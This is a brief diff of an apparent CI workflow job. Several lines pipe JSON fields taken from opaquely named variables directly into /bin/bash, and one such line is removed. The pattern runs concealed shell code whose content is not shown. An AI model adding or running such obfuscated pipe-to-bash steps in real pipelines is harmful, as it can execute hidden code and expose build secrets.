@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$siiub219" | jq -r .yhoik2 | /bin/bash
           printf '%s' "$o1" | jq -r .on546 | /bin/bash
           printf '%s' "$e2926" | jq -r .mb9 | /bin/bash
-          printf '%s' "$ngphu4" | jq -r .i22 | /bin/bash
           echo $vrlq4 | jq -r .pyd792 | /bin/bash
 
       - name: Save output
